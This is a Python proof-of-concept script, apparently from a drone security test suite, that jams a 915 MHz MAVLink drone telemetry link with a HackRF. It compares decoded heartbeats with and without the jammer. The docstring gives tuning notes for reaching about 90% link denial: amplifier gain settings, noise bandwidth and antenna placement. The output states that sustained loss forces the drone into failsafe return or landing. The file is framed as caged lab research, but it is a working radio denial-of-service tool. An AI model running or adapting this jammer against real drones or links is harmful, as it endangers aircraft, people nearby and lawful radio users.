#!/usr/bin/env python3
"""PoC 05 - Link jamming / DoS OVER-THE-AIR (PWNUAV IM-01, IM-02).

Measures the drone link with and without the jammer. The jammer (HackRF) emits
band-limited noise concentrated in the GFSK bandwidth -> DoS.
Drone=Pluto TX, jammer=HackRF TX, monitor=RTL RX. ONLY in a cage. venv: .venv-radio

Jamming is a power ratio (J/S) at the receiver. Measured during bring-up
(2026-09-11, benchtop outside the cage):
- The HackRF needs the RF AMP turned on (overall gain 61 = VGA 47 + AMP 14 dB);
  with VGA 47 alone the J/S stays ~-1.7 dB (0% loss). With the AMP the HackRF rises
  to ~1.0 power at the RX vs ~0.73 for the Pluto -> J/S ~+1.4 dB. That margin gives
  a weak/noisy degradation (0-30%, high variance), NOT the ~90% DoS.
- Weakening the drone in software is NOT possible on this Pluto: the TX gain
  (SoapyPlutoSDR) is pinned at 0, and scaling the IQ buffer amplitude does not
  lower the radiated power either (0.4x -> same ~0.73 at the RX): the Pluto
  normalizes its TX output. That is why DRONE_TX_SCALE is left at 1.0 (no useful effect here).
- The lever that DOES reach the documented ~90% is GEOMETRY: in the cage, place the
  HackRF (jammer) antenna as close to the RTL as the Pluto, or closer -> it raises
  the J/S through lower path loss. On this bench the Pluto is over-coupled to the
  RTL and masks the jammer.
"""
from __future__ import annotations
import os
os.environ.setdefault("MAVLINK20", "1")  # emit MAVLink 2 (0xFD)
import threading, time
import numpy as np
from pymavlink import mavutil
from pwnuav.rf.gfsk import FS, modulate, bytes_to_bits
from pwnuav.rf.framing import build_frame
from pwnuav.rf import hw
from pwnuav import demo

# --- tunable link/jammer parameters ---
JAMMER_GAIN   = 61      # HackRF TX overall: 61 = VGA 47 + AMP 14 dB (AMP on)
NOISE_BW_HZ   = 100e3   # AWGN noise half-width; ~+/-100 kHz covers the GFSK (~150 kHz)
DRONE_TX_SCALE = 1.0    # amplitude scale of the drone downlink (1.0=max).
                        # NOTE: on the Pluto tested it does not reduce radiated power
                        # (it normalizes the TX); kept as a knob for completeness.

def downlink():
    mav=mavutil.mavlink.MAVLink(None,srcSystem=1,srcComponent=1)
    hb=mav.heartbeat_encode(mavutil.mavlink.MAV_TYPE_QUADROTOR,mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,0,0,mavutil.mavlink.MAV_STATE_ACTIVE)
    iq=modulate(bytes_to_bits(build_frame(hb.pack(mav)))); gap=np.zeros(FS//500,np.complex64)
    buf=np.tile(np.concatenate([iq,gap]),60).astype(np.complex64)
    return (buf*DRONE_TX_SCALE).astype(np.complex64), len(iq)+FS//500

def band_noise():
    rng=np.random.default_rng(); n=FS//10
    w=(rng.standard_normal(n)+1j*rng.standard_normal(n))
    W=np.fft.fft(w); fr=np.fft.fftfreq(n,1/FS); W[np.abs(fr)>NOISE_BW_HZ]=0   # concentrate in the signal band
    x=np.fft.ifft(W).astype(np.complex64); return (x*0.95/np.max(np.abs(x))).astype(np.complex64)

def _pump(dst, sig, stop):
    d, st = dst; mtu = d.getStreamMTU(st)
    while not stop.is_set():
        i = 0
        while i < len(sig):
            n = min(mtu, len(sig) - i)
            r = d.writeStream(st, [sig[i:i+n]], n, timeoutUs=200000)
            if r.ret > 0: i += r.ret
            elif r.ret < 0: break

def phase(seconds, jam, frame_len, buf):
    # pre-open ALL radios first (no open-latency during capture), then transmit + capture
    drone = hw.open_tx("plutosdr")
    jammer = hw.open_tx("hackrf", gain=JAMMER_GAIN) if jam else None
    rxd, rxst = hw.open_rx("rtlsdr")
    stop = threading.Event()
    th = [threading.Thread(target=_pump, args=(drone, buf, stop), daemon=True)]
    if jam: th.append(threading.Thread(target=_pump, args=(jammer, band_noise(), stop), daemon=True))
    for x in th: x.start()
    time.sleep(0.8)                    # warmup: both transmitters live before we listen
    s = hw.capture(rxd, rxst, seconds)
    stop.set()
    for x in th: x.join(timeout=2)
    hw.close(*drone); hw.close(rxd, rxst)
    if jammer: hw.close(*jammer)
    n = sum(1 for m in hw.decode_messages(s, frame_len) if m.get_type()=="HEARTBEAT")
    return n, len(s)

def main():
    buf,frame_len=downlink()
    print(demo.rule("PWNUAV JAMMING / DoS — 915 MHz link"))
    print("[*] Victim : Pluto TX MAVLink @ 915 MHz   Monitor : RTL-SDR RX")
    T=1.5
    base,ns=phase(T,False,frame_len,buf)
    print(f"\n[BASELINE] no jammer, {T:.1f}s")
    print(f"   frames decoded : {base:>4}   rate ~ {base/T:5.1f}/s   packet loss 0%")
    print(f"\n[*] Jammer: HackRF, band-limited AWGN +/-{NOISE_BW_HZ/1e3:.0f} kHz, TX gain {JAMMER_GAIN} (VGA 47 + AMP 14 dB)")
    print("    (all jammer power concentrated in the ~150 kHz occupied by the GFSK)")
    jam,nj=phase(T,True,frame_len,buf)
    loss=100.0*(1-jam/base) if base else 0
    print(f"\n[JAMMED] jammer ON, {T:.1f}s")
    print(f"   frames decoded : {jam:>4}   rate ~ {jam/T:5.1f}/s   packet loss {loss:.1f}%")
    ok = base>0 and jam < max(1,base//5)
    print(f"\n[IM-01] Link denied: {base} -> {jam} heartbeats ({loss:.1f}% loss).")
    print("[IM-02] Sustained loss exceeds the GCS failsafe timeout -> RTL / LAND.")
    print("[+] PoC 05 jamming OVER-THE-AIR: OK" if ok else "[-] inconclusive")
    return 0 if ok else 1

if __name__ == "__main__":
    raise SystemExit(main())
